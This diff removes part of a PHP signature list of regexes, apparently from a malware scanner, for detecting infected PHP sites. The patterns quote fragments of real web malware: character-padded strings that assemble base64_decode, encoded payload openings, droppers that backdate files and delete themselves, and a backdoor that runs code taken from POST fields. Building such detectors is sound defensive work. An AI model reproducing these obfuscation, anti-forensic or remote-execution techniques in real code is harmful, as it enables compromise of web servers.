-      'pattern' => '/\\<\\?php \\$xvaesku\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$nqxca\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
-      'label' => 'source-file tail snippet',
-    ),
-    140 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pfgbt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ykpuxkyar\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
-      'label' => 'source-file tail snippet',
-    ),
-    141 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$ddmqy,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    142 => 
-    array (
-      'pattern' => '/LyphaHV1cHh4cW5ud2sqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    143 => 
-    array (
-      'pattern' => '/\\<\\?php echo "WbmmHNuGMD"; if \\(file_exists\\("\\.\\/realtones\\.php"\\)\\)\\{ touch\\("\\.\\/realtones\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dUasPYN/',
-      'label' => 'source-file tail snippet',
-    ),
-    144 => 
-    array (
-      'pattern' => '/\\<\\?php \\$futnaxznk\\=str_ireplace\\("k","","kkkbkkkakkkkskkkkkkekkkk6kkkk4kk_kkkkkkdkkkkkekkkkckkkkokkkkkdkkkkkkekkk"\\); \\$mcbsqsfvvx\\="DQoJCUBlcnJvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    145 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fcbtp\\=str_ireplace\\("f","","fbfffafffffsffffeff6ff4ff_ffdfffefffffcfffoffffdfffeff"\\); \\$dtrsna\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUB/',
-      'label' => 'source-file tail snippet',
-    ),
-    146 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mttvbba\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ksvrmd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
-      'label' => 'source-file tail snippet',
-    ),
-    147 => 
-    array (
-      'pattern' => '/\\<\\?php \\$negxaspm\\=str_ireplace\\("g","","gggbgggagggsggggeggggg6ggggg4ggg_ggggdggeggggggcggogggggdggggeggg"\\); \\$yspnywxnb\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    148 => 
-    array (
-      'pattern' => '/LypzcXVlenZjcGduaGcqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    149 => 
-    array (
-      'pattern' => '/\\<\\?php echo "mptnmQvEbT"; if \\(file_exists\\("\\.\\/error\\-500\\.php"\\)\\)\\{ touch\\("\\.\\/error\\-500\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*s2z3TVD/',
-      'label' => 'source-file tail snippet',
-    ),
-    150 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hugrzzmgv\\=str_ireplace\\("t","","ttbttatttstttttettttt6ttt4tttt_tttttdtttettttctttotttdtttet"\\); \\$gqwxnk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    151 => 
-    array (
-      'pattern' => '/Lyp1Y2tocXhmZXd1YmYqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    152 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rvmgzc\\=str_ireplace\\("u","","uuubuuuauuusuueuuuuu6uuuu4uuu_uuuuuduueuucuuuuouuuuuduuuuueu"\\); \\$pnhafzkf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    153 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gmsgtwhdw\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bpamfuprn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUB/',
-      'label' => 'source-file tail snippet',
-    ),
-    154 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$License                            \\(\\)                      ;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    155 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mhmdcbuyq\\=str_ireplace\\("k","","kkkbkkkkkakkskkkkkkekkkk6kkkk4kkkk_kkkkkdkkkekkkkckkkkkokkkkkkdkkkkek"\\); \\$ayketmhx\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    156 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$ssmbshvarsapnkw,array\\([\\s\\S]{0,160}GMT"\\);
-\\/\\/header\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    157 => 
-    array (
-      'pattern' => '/\\<\\?php \\$nfukzg\\=str_ireplace\\("m","","mmbmmmmmmammmmsmmmmemmmmm6mmmmm4mmmm_mmmdmmmmmmemmmmmmcmmmmommmdmmmemmm"\\); \\$wdqmubtseg\\="DQoJCUBlcnJvcl9yZ/',
-      'label' => 'source-file tail snippet',
-    ),
-    158 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hdumyysk\\=str_ireplace\\("h","","hbhhahhhhhshhhhhehhh6hhhh4hhhh_hhhhdhhhehhhchhhohhhhdhhhhehh"\\); \\$puvpv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    159 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yxstcb\\=str_ireplace\\("h","","hhhbhhhahhhhshhhehhhh6hhh4hhhh_hhdhhhhehhhchhhhhohhhdhhhehh"\\); \\$yxrbapfkm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    160 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ptxeqrta\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiii6iiii4iiii_iiiidiiiiieiiiiciioiiidiiiiiieii"\\); \\$pvhtwp\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    161 => 
-    array (
-      'pattern' => '/\\<\\?php echo "pXZUTkFNQV"; if \\(file_exists\\("\\.\\/admin_forums\\.php"\\)\\)\\{ touch\\("\\.\\/admin_forums\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*b/',
-      'label' => 'source-file tail snippet',
-    ),
-    162 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ekhuygp\\=str_ireplace\\("m","","mmbmmmmmammmmmmsmmmemmmmmm6mmm4mmmm_mmdmmmmmemmmmmcmmmommmmdmmemmm"\\); \\$ksdyahy\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    163 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$w                          \\= strtoupper     \\(\\$k\\[8\\]\\. \\$k\\[0\\]\\. \\$k\\[16\\]\\.\\$k\\[11\\]\\.\\$k\\[19\\]\\); \\$h\\=\\$\\{ \\$w \\} \\[\'d\'\\]\\(\'\', \\$\\{ \\$w \\} \\[\'f\'\\]\\(\\$\\{ \\$w \\} \\[\'s\'\\]\\("c", "",/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    164 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xzmbnkyyg\\=str_ireplace\\("z","","zbzzzazzzszzzzzzezzzzz6zz4zzzz_zzzzzdzzzzzezzzzzczzzzozzzzdzzzzez"\\); \\$dutfwnn\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    165 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vsgkvd\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwww6wwwww4wwwww_wwwwwdwwewwwwwcwwwwwowwwwdwwwwew"\\); \\$qexzxcc\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    166 => 
-    array (
-      'pattern' => '/\\<\\?php echo "zqFftBSSaY"; if \\(file_exists\\("\\.\\/album_upload\\.php"\\)\\)\\{ touch\\("\\.\\/album_upload\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9/',
-      'label' => 'source-file tail snippet',
-    ),
-    167 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pwasvpu\\=str_ireplace\\("x","","xxxbxxxxxaxxsxxxxxexxx6xxxxx4xxxx_xxxxxdxxxxxexxxxxcxxoxxdxxexx"\\); \\$cpagsf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    168 => 
-    array (
-      'pattern' => '/\\<\\?php echo "XwCFAsazMq"; if \\(file_exists\\("\\.\\/refunds\\.php"\\)\\)\\{ touch\\("\\.\\/refunds\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dZW0x6ntUv1/',
-      'label' => 'source-file tail snippet',
-    ),
-    169 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hbxfgvvz\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqqqeqqq6qqqqq4qq_qqqqqdqqqqeqqqqqqcqqqoqqqqqqdqqqqqeqq"\\); \\$tbvde\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    170 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wzgvztqf\\=str_ireplace\\("v","","vvbvvavvvvvsvvvvevvvvv6vvvvv4vvv_vvvvvdvvvevvcvvvvovvvvvdvvvvevv"\\); \\$chyrdaa\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    171 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ehxqcgz\\=str_ireplace\\("p","","pppbppappspppppeppp6ppp4pppp_pppdpppeppppcpppppopppdppppep"\\); \\$vrdqwynqh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    172 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xvhhgyncv\\=str_ireplace\\("g","","gggbggagggggsggggegg6ggggg4ggg_ggggdgggggeggggcgggggoggggdgggegg"\\); \\$qnfxbh\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    173 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fmsdgzs\\=str_ireplace\\("p","","ppbppppppappppspppppepppp6ppp4ppp_ppppdppppppeppppcppppppoppppppdppppep"\\); \\$cqwya\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    174 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fkzyt\\=str_ireplace\\("i","","iibiiiiaiiiiisiiiiiieiiii6iii4iiii_iiiiidiiiieiiiiiiciiiiioiidiiiei"\\); \\$xndka\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    175 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dubazdry\\=str_ireplace\\("z","","zzbzzzzzzazzzszzzzzezz6zzzzz4zzz_zzzzzzdzzzezzzzzzczzzozzzzzdzzzezzz"\\); \\$axnhhmr\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    176 => 
-    array (
-      'pattern' => '/LypudnNnbmZ0d3B2dHJ1cGQqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    177 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hcftvxs\\=str_ireplace\\("w","","wwwbwwwwwawwwswwwwewwww6wwww4wwwww_wwwwwdwwwwwewwcwwwwwowwwdwwwwwwew"\\); \\$xehygm\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    178 => 
-    array (
-      'pattern' => '/LyptdmZtdHhyY2sqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypo/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    179 => 
-    array (
-      'pattern' => '/\\* @copyright  Copyright \\(C\\) 2005 \\- 2015 Open Source Matters, Inc\\. All rights reserved\\.[\\s\\S]{0,12000}iterator_apply                             \\(\\$option, \\$win,       array             \\(\\$it\\)                  \\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    180 => 
-    array (
-      'pattern' => '/\\<\\?php echo "UmVgDhdKFM"; if \\(file_exists\\("\\.\\/segnala\\.php"\\)\\)\\{ touch\\("\\.\\/segnala\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*mwCV0TgqxRY/',
-      'label' => 'source-file tail snippet',
-    ),
-    181 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kxbyqm\\=str_ireplace\\("h","","hhbhhhhahhhhhshhhehh6hhhh4hhhhh_hhhhhhdhhhhhehhhhchhohhhhdhhhhehhh"\\); \\$ezxcv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    182 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fpepbxtd\\=str_ireplace\\("n","","nnnbnnnnnannnsnnnnennn6nnnn4nnn_nndnnennnncnnnonnnndnnnnennn"\\); \\$decxxcnc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    183 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xtbyudzrp\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$extnqg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    184 => 
-    array (
-      'pattern' => '/\\<\\?php \\$psweevmbu\\=str_ireplace\\("t","","ttbttttattttstttttettt6ttttt4tttttt_ttttdttttettctttotttdtttttettt"\\); \\$vvpnygyxrd\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    185 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ffpec\\=str_ireplace\\("i","","iiibiiiaiisiiieiiiii6iiiii4iiiiii_iiiiiidiiieiiiiciiiioiiiiidiiiieii"\\); \\$tmamffrtbq\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    186 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ttawtdqv\\=str_ireplace\\("p","","pbppppappppsppppppepppp6ppppp4pppp_ppppdppppeppppppcppppppopppdppppeppp"\\); \\$vvsgz\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    187 => 
-    array (
-      'pattern' => '/\\<\\?php echo "YrHcwRvFTt"; if \\(file_exists\\("\\.\\/park\\.inc\\.php"\\)\\)\\{ touch\\("\\.\\/park\\.inc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4GakpK4UU/',
-      'label' => 'source-file tail snippet',
-    ),
-    188 => 
-    array (
-      'pattern' => '/\\<\\?php \\$meggdkswq\\=str_ireplace\\("r","","rrbrrrrrrarrrrsrrrrerrr6rrrrrr4rrrr_rrrdrrrerrrrcrrrrorrrrdrrrrer"\\); \\$qnhmbswkv\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    189 => 
-    array (
-      'pattern' => '/\\<\\?php \\$utaxhset\\=str_ireplace\\("k","","kkbkkkakkkkskkekkkkk6kkk4kkkkk_kkkkdkkkekkkkkkckkkkkokkkdkkkkekkk"\\); \\$ancea\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    190 => 
-    array (
-      'pattern' => '/\\<\\?php \\$nhquayfzwz\\=str_ireplace\\("p","","pbppppappppsppppppepppp6ppppp4pppp_ppppdppppeppppppcppppppopppdppppeppp"\\); \\$pqxauacu\\="DQoJCUBlcnJvcl9/',
-      'label' => 'source-file tail snippet',
-    ),
-    191 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bskhqrwwcu\\=str_ireplace\\("u","","uuubuuuuauuuusuuuueuuuuuu6uuuu4uuuu_uuuuduuuueuuuucuuuouuuuuduuueu"\\); \\$gnakgtv\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    192 => 
-    array (
-      'pattern' => '/\\<\\?php echo "AyfmskxZuZ"; if \\(file_exists\\("\\.\\/api\\.suggest\\.php"\\)\\)\\{ touch\\("\\.\\/api\\.suggest\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*hCz/',
-      'label' => 'source-file tail snippet',
-    ),
-    193 => 
-    array (
-      'pattern' => '/LyplaHRyeiovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKmZzYmNx/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    194 => 
-    array (
-      'pattern' => '/\\<\\?php echo "HeDXzaPkgT"; if \\(file_exists\\("\\.\\/site_login\\.php"\\)\\)\\{ touch\\("\\.\\/site_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ddCQN/',
-      'label' => 'source-file tail snippet',
-    ),
-    195 => 
-    array (
-      'pattern' => '/Lyp2dXp5dGsqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypid2ty/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    196 => 
-    array (
-      'pattern' => '/LypweGducHptZnAqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypk/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    197 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pmfhfgzz\\=str_ireplace\\("g","","gggbggagggggsggggegg6ggggg4ggg_ggggdgggggeggggcgggggoggggdgggegg"\\); \\$srdukpup\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    198 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dwcuynhtz\\=str_ireplace\\("p","","ppbppppappppsppppeppppp6ppppp4ppppp_ppppppdppppppeppppppcppppoppppdppppppep"\\); \\$xbdfeapwpr\\="DQoJCUBlcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    199 => 
-    array (
-      'pattern' => '/\\<\\?php echo "txAcDyMGPX"; if \\(file_exists\\("\\.\\/goods_script\\.php"\\)\\)\\{ touch\\("\\.\\/goods_script\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*k/',
-      'label' => 'source-file tail snippet',
-    ),
-    200 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kaxxctbupv\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$zwfgtqf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
-      'label' => 'source-file tail snippet',
-    ),
-    201 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ehcpr\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xxxx4xx_xxxxdxxxexxxcxxxxoxxxdxxxxex"\\); \\$tcgsucaz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    202 => 
-    array (
-      'pattern' => '/\\<\\?php echo "eatycfrfCa"; if \\(file_exists\\("\\.\\/frozenLib\\.php"\\)\\)\\{ touch\\("\\.\\/frozenLib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ar1G7gE/',
-      'label' => 'source-file tail snippet',
-    ),
-    203 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zzwnrt\\=str_ireplace\\("t","","ttbttttattttstttttettt6ttttt4tttttt_ttttdttttettctttotttdtttttettt"\\); \\$dvwnvmcab\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    204 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rndzz\\=str_ireplace\\("i","","ibiiaiisiiiieiiiiii6iii4iiii_iidiiiiieiiiciiiioiiiidiiiiiei"\\); \\$sdebzzz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
-      'label' => 'source-file tail snippet',
-    ),
-    205 => 
-    array (
-      'pattern' => '/\\<\\?php \\$stmww\\=str_ireplace\\("m","","mmbmmmmammmmsmmemmmmm6mmmmm4mmmm_mmdmmmmmemmcmmmommmmmmdmmmemmm"\\); \\$rawsqpkh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    206 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tsctsrwhha\\=str_ireplace\\("x","","xxxbxxxxxaxxxsxxxxxexx6xxxxx4xxxxx_xxxxdxxxxxxexxxxcxxxxxoxxxxdxxxxxxex"\\); \\$yydzbgxtt\\="DQoJCUBlcnJvcl/',
-      'label' => 'source-file tail snippet',
-    ),
-    207 => 
-    array (
-      'pattern' => '/\\<\\?php \\$quetsnbn\\=str_ireplace\\("r","","rbrrrrrarrrrrrsrrrrerrrr6rrrrr4rrrrrr_rrrrrrdrrrrerrrcrrrrorrrrrrdrrrrer"\\); \\$ckzdtwad\\="DQoJCUBlcnJvcl9y/',
-      'label' => 'source-file tail snippet',
-    ),
-    208 => 
-    array (
-      'pattern' => '/\\);\\$uucme\\=\\$ucbrs\\(\\$fgatrpeewpea\\);trigger_error\\(\\$uucme,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    209 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}array_map                      \\(\'a\', array      \\(\\$_POST\\[\'f\'\\]             \\(  \\$_POST\\[\'c\'\\]\\)                      \\)\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    210 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xccfrw\\=str_ireplace\\("h","","hhhbhhhhhhahhshhhhhhehhh6hhhhh4hhh_hhhdhhhhehhhchhhhohhhhhdhhhheh"\\); \\$zgafau\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    211 => 
-    array (
-      'pattern' => '/\\<\\?php echo "YCWVNvfVQN"; if \\(file_exists\\("\\.\\/sang\\.lib\\.php"\\)\\)\\{ touch\\("\\.\\/sang\\.lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dfmdDf0dS/',
-      'label' => 'source-file tail snippet',
-    ),
-    212 => 
-    array (
-      'pattern' => '/Lyp2d21uenp2bXpzKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8q/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    213 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pfqzx\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqeqq6qqqq4qqqq_qqqqqdqqqeqqqcqqqqoqqqdqqqqeq"\\); \\$dhnzfub\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
-      'label' => 'source-file tail snippet',
-    ),
-    214 => 
-    array (
-      'pattern' => '/\\<\\?php echo "tmYQdTSwQg"; if \\(file_exists\\("\\.\\/article_details\\.php"\\)\\)\\{ touch\\("\\.\\/article_details\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__/',
-      'label' => 'source-file tail snippet',
-    ),
-    215 => 
-    array (
-      'pattern' => '/\\<\\?php echo "YPfhknqUND"; if \\(file_exists\\("\\.\\/reseller\\.php"\\)\\)\\{ touch\\("\\.\\/reseller\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*aeGrEqPXG/',
-      'label' => 'source-file tail snippet',
-    ),
-    216 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ytncpy\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiii6iiii4iiii_iiiidiiiiieiiiiciioiiidiiiiiieii"\\); \\$pzuangestw\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    217 => 
-    array (
-      'pattern' => '/\\);\\$snxyqkaufrw\\=\\$qu\\(\\$rfqcc\\);trigger_error\\(\\$snxyqkaufrw,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    218 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xuyhd\\=str_ireplace\\("v","","vvbvvavvvvvsvvvvevvvvv6vvvvv4vvv_vvvvvdvvvevvcvvvvovvvvvdvvvvevv"\\); \\$faptu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    219 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ernwr\\=str_ireplace\\("q","","qqqbqqqaqqqqqqsqqqqqqeqq6qqqq4qqq_qqqqdqqqeqqqcqqqqqqoqqqqdqqqqeq"\\); \\$krcufbs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    220 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bravqzt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ksfbtgnprc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
-      'label' => 'source-file tail snippet',
-    ),
-    221 => 
-    array (
-      'pattern' => '/\\<\\?php echo "tnXxUtYkyZ"; if \\(file_exists\\("\\.\\/forgotpassword\\.php"\\)\\)\\{ touch\\("\\.\\/forgotpassword\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    222 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$veybpqsghsps,array\\([\\s\\S]{0,160}GMT"\\);
-\\/\\/header\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    223 => 
-    array (
-      'pattern' => '/\\<\\?php \\$aqeubk\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$aqfmwhyvxh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    224 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bupwgex\\=str_ireplace\\("q","","qqqbqqqqqaqqqqqsqqqqqqeqqqq6qq4qq_qqqqqqdqqqqeqqqqcqqqqqoqqqqdqqqeqqq"\\); \\$nrakw\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    225 => 
-    array (
